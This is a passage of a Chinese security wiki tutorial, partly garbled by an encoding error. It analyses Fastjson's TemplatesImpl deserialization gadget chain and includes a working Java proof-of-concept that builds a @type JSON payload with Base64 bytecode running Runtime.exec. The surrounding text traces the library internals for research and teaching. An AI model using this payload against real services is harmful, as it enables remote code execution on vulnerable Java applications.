    â””â”€generated<span class="token operator">-</span>sources
        â””â”€annotations
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="templatesimpl-exploit" tabindex="-1"><a class="header-anchor" href="#templatesimpl-exploit"><span>TemplatesImpl Exploit</span></a></h3><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo1Exp</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> randomClassName <span class="token operator">=</span> <span class="token string">&quot;ref4&quot;</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>randomClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilCode <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> evilCodeBase64 <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>evilCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">=</span> <span class="token string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token string">&quot;{&quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> <span class="token operator">+</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">+</span> <span class="token string">&quot;\&quot;,&quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> <span class="token operator">+</span> evilCodeBase64 <span class="token operator">+</span> <span class="token string">&quot;\&quot;],&quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;&#39;_name&#39;:&#39;object&#39;,&quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;&#39;_tfactory&#39;:{ },&quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;_outputProperties:{ }&quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;}&quot;</span><span class="token punctuation">;</span>

            <span class="token comment">// &quot;\&quot;_outputProperties\&quot;:{ }&quot;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240414003049-1wqzvqm.e4c9b130.png" alt="image" loading="lazy">â€‹</p><h4 id="ä¸ºä»€ä¹ˆæ¶æ„ç±»éœ€è¦ç»§æ‰¿-abstracttranslet-ç±»" tabindex="-1"><a class="header-anchor" href="#ä¸ºä»€ä¹ˆæ¶æ„ç±»éœ€è¦ç»§æ‰¿-abstracttranslet-ç±»"><span>ä¸ºä»€ä¹ˆæ¶æ„ç±»éœ€è¦ç»§æ‰¿ AbstractTranslet ç±»</span></a></h4><p>TemplatesImpl åˆ©ç”¨é“¾ä¸­ <code>defineTransletClasses()</code>â€‹ æ–¹æ³•ä¼šåˆ¤æ–­æ¶æ„ç±»çš„çˆ¶ç±»ç±»åæ˜¯å¦æ˜¯ <code>ABSTRACT_TRANSLET</code>â€‹ï¼ˆï¼‰ï¼Œæ˜¯çš„è¯ <code>_transletIndex</code>â€‹ å˜é‡çš„å€¼è¢«è®¾ç½®ä¸º 0ï¼Œåˆ°åé¢çš„ if åˆ¤æ–­è¯­å¥ä¸­å°±ä¸ä¼šè¢«è¯†åˆ«ä¸º <code>&lt;0</code>â€‹ è€ŒæŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢ç¨‹åºã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240417180104-3bquum3.cb836691.png" alt="image" loading="lazy">â€‹</p><h4 id="ä¸ºä»€ä¹ˆéœ€è¦å¯¹-bytecodes-è¿›è¡Œ-base64-ç¼–ç " tabindex="-1"><a class="header-anchor" href="#ä¸ºä»€ä¹ˆéœ€è¦å¯¹-bytecodes-è¿›è¡Œ-base64-ç¼–ç "><span>ä¸ºä»€ä¹ˆéœ€è¦å¯¹ _bytecodes è¿›è¡Œ Base64 ç¼–ç </span></a></h4><p>åœ¨ poc ä¸­çš„ <code>_bytecodes</code>â€‹ å­—æ®µæ˜¯ç»è¿‡ Base64 ç¼–ç çš„ï¼Œä¸ºä»€ä¹ˆè¦æ€ä¹ˆåšå‘¢ï¼Ÿåˆ†æ Fastjson å¯¹ JSON å­—ç¬¦ä¸²çš„è§£æè¿‡ç¨‹ï¼ŒåŸç† Fastjson æå– <code>byte[]</code>â€‹ æ•°ç»„å­—æ®µå€¼æ—¶ä¼šè¿›è¡Œ Base64 è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€  payload æ—¶éœ€è¦å¯¹ <code>_bytecodes</code>â€‹ å­—æ®µè¿›è¡Œ Base64 åŠ å¯†å¤„ç†ã€‚</p><p>åœ¨ <code>setValue()</code>â€‹ ä¹‹å‰ä¼šè¿›è¡Œ <code>ObjectArrayCodec.deserialze()</code>â€‹ å‡½æ•°ä¸­ --&gt; ä¼šè°ƒç”¨ <code>lexer.bytesValue()</code>â€‹ å¯¹ byte æ•°ç»„è¿›è¡Œå¤„ç† --&gt; è·Ÿè¿› <code>bytesValue()</code>â€‹ å‡½æ•°ï¼Œå°±æ˜¯å¯¹ <code>_bytecodes</code>â€‹ çš„å†…å®¹è¿›è¡Œ Base64 è§£ç ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// com.alibaba.fastjson.parser.ParserConfig#getDeserializer</span>
<span class="token comment">// com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</span>
<span class="token comment">// com.alibaba.fastjson.parser.JSONScanner#bytesValue</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">deserialze</span><span class="token punctuation">(</span><span class="token class-name">DefaultJSONParser</span> parser<span class="token punctuation">,</span> <span class="token class-name">Type</span> type<span class="token punctuation">,</span> <span class="token class-name">Object</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">final</span> <span class="token class-name">JSONLexer</span> lexer <span class="token operator">=</span> parser<span class="token punctuation">.</span>lexer<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">COMMA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">LITERAL_STRING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">bytesValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">COMMA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> bytes<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418091019-6jresq6.41eee1ff.png" alt="image" loading="lazy">â€‹</p><h4 id="ä¸ºä»€ä¹ˆéœ€è¦è®¾ç½®-tfactory-ä¸º" tabindex="-1"><a class="header-anchor" href="#ä¸ºä»€ä¹ˆéœ€è¦è®¾ç½®-tfactory-ä¸º"><span>ä¸ºä»€ä¹ˆéœ€è¦è®¾ç½® _tfactory ä¸º {}</span></a></h4><p>TemplatesImpl åˆ©ç”¨é“¾ä¸­åœ¨ <code>getTransletInstance()</code>â€‹ å‡½æ•°ä¸­è°ƒç”¨äº† <code>defineTransletClasses()</code>â€‹ å‡½æ•°æ˜¯ç”¨äºç”Ÿæˆ Java ç±»çš„ï¼Œåœ¨å…¶ä¸­ä¼šæ–°å»ºä¸€ä¸ªè½¬æ¢ç±»åŠ è½½å™¨ï¼Œå…¶ä¸­ä¼šè°ƒç”¨åˆ° <code>_tfactory.getExternalExtensionsMap()</code>â€‹ æ–¹æ³•ï¼Œè‹¥ <code>_tfactory</code>â€‹ ä¸º null åˆ™ä¼šå¯¼è‡´è¿™æ®µä»£ç æŠ¥é”™ã€ä»è€Œæ— æ³•ç”Ÿæˆæ¶æ„ç±»ï¼Œè¿›è€Œæ— æ³•æˆåŠŸæ”»å‡»åˆ©ç”¨ã€‚</p><p>ä¸»è¦è¿˜æ˜¯çœ‹ Java ç‰ˆæœ¬ï¼Œjava1.8.0_20(1.8u20) å¹¶æ²¡æœ‰ <code>_tfactory.getExternalExtensionsMap()</code>â€‹ è¿™ä¸ªåˆ¤æ–­ã€‚</p><h4 id="ä¸ºä»€ä¹ˆååºåˆ—åŒ–è°ƒç”¨-getter-æ–¹æ³•æ—¶ä¼šè°ƒç”¨åˆ°-templatesimpl-getoutputproperties-æ–¹æ³•" tabindex="-1"><a class="header-anchor" href="#ä¸ºä»€ä¹ˆååºåˆ—åŒ–è°ƒç”¨-getter-æ–¹æ³•æ—¶ä¼šè°ƒç”¨åˆ°-templatesimpl-getoutputproperties-æ–¹æ³•"><span>ä¸ºä»€ä¹ˆååºåˆ—åŒ–è°ƒç”¨ getter æ–¹æ³•æ—¶ä¼šè°ƒç”¨åˆ° TemplatesImpl.getOutputProperties() æ–¹æ³•</span></a></h4><p>getOutputProperties() æ–¹æ³•æ˜¯ä¸ªæ— å‚æ•°çš„éé™æ€çš„ getter æ–¹æ³•ï¼Œä»¥ get å¼€å¤´ä¸”ç¬¬å››ä¸ªå­—æ¯ä¸ºå¤§å†™å½¢å¼ï¼Œå…¶è¿”å›å€¼ç±»å‹æ˜¯ Properties å³ç»§æ‰¿è‡ª Map ç±»å‹ï¼Œæ»¡è¶³ä¹‹å‰é¢è¯´çš„ <a href="%5B%E5%BE%97%E5%87%BA%E4%BB%A5%E4%B8%8B%E7%BB%93%E8%AE%BA%EF%BC%8CFastjson%20%E4%BC%9A%E5%AF%B9%E6%BB%A1%E8%B6%B3%E4%B8%8B%E5%88%97%E8%A6%81%E6%B1%82%E7%9A%84%20setter/getter%20%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8C%E8%B0%83%E7%94%A8%EF%BC%9A%5D(siyuan://blocks/20240416155849-cy5q1rx)">Fastjson ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨çš„ getter æ–¹æ³•çš„æ¡ä»¶</a>ã€‚</p><p>å› æ­¤åœ¨ä½¿ç”¨ Fastjson å¯¹ TemplatesImpl ç±»å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ <code>getOutputProperties()</code>â€‹ æ–¹æ³•ã€‚</p><h4 id="å¦‚ä½•å…³è”-outputproperties-ä¸-getoutputproperties-æ–¹æ³•" tabindex="-1"><a class="header-anchor" href="#å¦‚ä½•å…³è”-outputproperties-ä¸-getoutputproperties-æ–¹æ³•"><span>å¦‚ä½•å…³è” _outputProperties ä¸ getOutputProperties() æ–¹æ³•</span></a></h4><p>Fastjson ä¼šè¯­ä¹‰åˆ†æ JSON å­—ç¬¦ä¸²ï¼Œæ ¹æ®å­—æ®µ keyï¼Œè°ƒç”¨ <code>fieldList</code>â€‹ æ•°ç»„ä¸­å­˜å‚¨çš„ç›¸åº”æ–¹æ³•è¿›è¡Œå˜é‡åˆå§‹åŒ–èµ‹å€¼ã€‚</p><p>å…·ä½“çš„ä»£ç åœ¨ <code>JavaBeanDeserializer.parseField()</code>â€‹ ä¸­ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>smartMatch()</code>â€‹ æ–¹æ³•ä¼šæ›¿æ¢æ‰å­—æ®µ key ä¸­çš„ <code>_</code>â€‹ï¼Œä»è€Œä½¿å¾— <code>_outputProperties</code>â€‹ å˜æˆäº† outputPropertiesã€‚æ—¢ç„¶å·²ç»å¾—åˆ°äº† outputProperties å±æ€§äº†ï¼Œé‚£ä¹ˆè‡ªç„¶è€Œç„¶å°±ä¼šè°ƒç”¨åˆ° <code>getOutputProperties()</code>â€‹ æ–¹æ³•äº†ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</span>
<span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">parseField</span><span class="token punctuation">(</span><span class="token class-name">DefaultJSONParser</span> parser<span class="token punctuation">,</span> <span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">Object</span> object<span class="token punctuation">,</span> <span class="token class-name">Type</span> objectType<span class="token punctuation">,</span>
                              <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> fieldValues<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">JSONLexer</span> lexer <span class="token operator">=</span> parser<span class="token punctuation">.</span>lexer<span class="token punctuation">;</span> <span class="token comment">// xxx</span>

    <span class="token class-name">FieldDeserializer</span> fieldDeserializer <span class="token operator">=</span> <span class="token function">smartMatch</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// ....</span>
<span class="token punctuation">}</span>

<span class="token comment">// com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418093126-hhjja54.5658c660.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418093556-qbx89nd.57d88826.png" alt="image" loading="lazy">â€‹</p><p>ååºåºåˆ—åŒ–ä¹‹åï¼Œæœ€åé€šè¿‡ <code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code>â€‹ æ‰§è¡Œäº† TemplatesImpl çš„åˆ©ç”¨é“¾ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">TemplatesImpl</span>#<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
<span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
    <span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
        <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
            <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418100130-zsl439u.eed88cb5.png" alt="image" loading="lazy">â€‹</p><h4 id="ç»“åˆ-templatesimpl-åˆ©ç”¨é“¾æ¡ä»¶" tabindex="-1"><a class="header-anchor" href="#ç»“åˆ-templatesimpl-åˆ©ç”¨é“¾æ¡ä»¶"><span>ç»“åˆ TemplatesImpl åˆ©ç”¨é“¾æ¡ä»¶</span></a></h4><p>éœ€è¦ç»“åˆ TemplatesImpl åˆ©ç”¨é“¾æ¥è¿›è¡Œè¯´æ˜ï¼Œä¸»è¦æ˜¯ <code>TemplatesImpl#defineTransletClasses</code>â€‹ é‡Œé¢çš„åˆ¤æ–­ã€‚</p><p>æ¡ä»¶å¦‚ä¸‹ï¼š</p><ul><li><p>â€‹<code>_class == null;</code>â€‹</p></li><li><p>â€‹<code>_name != null;</code>â€‹</p></li><li><p>â€‹<code>_bytecodes != null</code></p><p><strong>ã€é€»è¾‘æ˜¯è¿™æ ·çš„ã€‘</strong></p></li></ul><ol><li>å…ˆåˆ¤æ–­ <code>_bytecodes</code>â€‹â€‹â€‹ æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™ä¼šè°ƒç”¨åˆ°è‡ªå®šä¹‰çš„ <code>ClassLoader</code>â€‹â€‹â€‹ å»åŠ è½½ <code>_bytecodes</code>â€‹â€‹â€‹ ä¸­çš„ <code>byte[]</code>â€‹â€‹â€‹ï¼Œå¹¶å¯¹ç±»çš„çˆ¶ç±»è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯ <code>ABSTRACT_TRANSLET</code>â€‹â€‹â€‹ ä¹Ÿå°±æ˜¯ <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>â€‹â€‹â€‹ï¼Œé‚£ä¹ˆå°±æŠŠç±»æˆå‘˜å±æ€§çš„ <code>_transletIndex</code>â€‹â€‹â€‹ è®¾ç½®æˆå½“å‰å¾ªç¯ä¸­çš„æ ‡è®°ä½ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨çš„è¯ï¼Œå°±æ˜¯ <code>class[0]</code>â€‹â€‹â€‹ã€‚</li><li>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„ <code>_bytecodes</code>â€‹â€‹â€‹ å’Œ <code>_outputProperties</code>â€‹â€‹â€‹ éƒ½æ˜¯ç±»æˆå‘˜å˜é‡ã€‚åŒæ—¶ï¼Œ<code>_outputProperties</code>â€‹â€‹â€‹ æœ‰è‡ªå·±çš„ <code>getter</code>â€‹â€‹â€‹ æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ <code>getOutputProperties</code>â€‹â€‹â€‹ã€‚ TemplatesImpl ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ getOutputProperties æ–¹æ³•ï¼Œ å¯¼è‡´ bytecodes å­—èŠ‚ç æˆåŠŸå®ä¾‹åŒ–é€ æˆ RCEã€‚</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240414124234-ddps6j5.42319a43.png" alt="image" loading="lazy">â€‹</p><h4 id="è°ƒè¯•åˆ†æ" tabindex="-1"><a class="header-anchor" href="#è°ƒè¯•åˆ†æ"><span>è°ƒè¯•åˆ†æ</span></a></h4><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span><span class="token constant">JSON</span>#parseObject
  <span class="token comment">// å¯¹ JSON å†…å®¹è¿›è¡Œæ‰«æï¼Œåœ¨ switch è¯­å¥ä¸­åŒ¹é…ä¸Šäº†â€{â€œå³å¯¹åº” 12</span>
  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#<span class="token class-name">DefaultJSONParser</span>
  <span class="token comment">// ç„¶åå¯¹ JSON æ•°æ®è°ƒç”¨ DefaultJSONParser.parseObject() è¿›è¡Œè§£æ</span>
  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#parseObject
    <span class="token comment">// é€šè¿‡ for è¯­å¥å¾ªç¯è§£æ JSON æ•°æ®å†…å®¹ï¼Œå…¶ä¸­ skipWhitespace() å‡½æ•°ç”¨äºå»é™¤æ•°æ®ä¸­çš„ç©ºæ ¼å­—ç¬¦ï¼Œç„¶åè·å–å½“å‰å­—ç¬¦æ˜¯å¦ä¸ºåŒå¼•å·ï¼Œæ˜¯çš„è¯å°±è°ƒç”¨ scanSymbol() è·å–åŒå¼•å·å†…çš„å†…å®¹</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240417172957-7aksbyt.b6b4adc4.png" alt="image" loading="lazy">â€‹</p><p>åˆ¤æ–­ key æ˜¯å¦ä¸º <code>@type</code>â€‹ ä¸”æ˜¯å¦å…³é—­äº† Feature.DisableSpecialKeyDetect è®¾ç½®ï¼Œé€šè¿‡åˆ¤æ–­åè°ƒç”¨ <code>scanSymbol()</code>â€‹ è·å–åˆ°äº† <code>@type</code>â€‹ å¯¹åº”çš„æŒ‡å®šç±» com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplï¼Œå¹¶è°ƒç”¨ <code>TypeUtils.loadClass()</code>â€‹ å‡½æ•°åŠ è½½è¯¥ç±»ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240417173110-zxvvvi6.fac68e34.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240417173856-ad706zi.439e0a7c.png" alt="image" loading="lazy">â€‹</p><p>çœ‹åˆ°å¦‚çº¢æ¡†çš„ä¸¤ä¸ªåˆ¤æ–­è¯­å¥ä»£ç 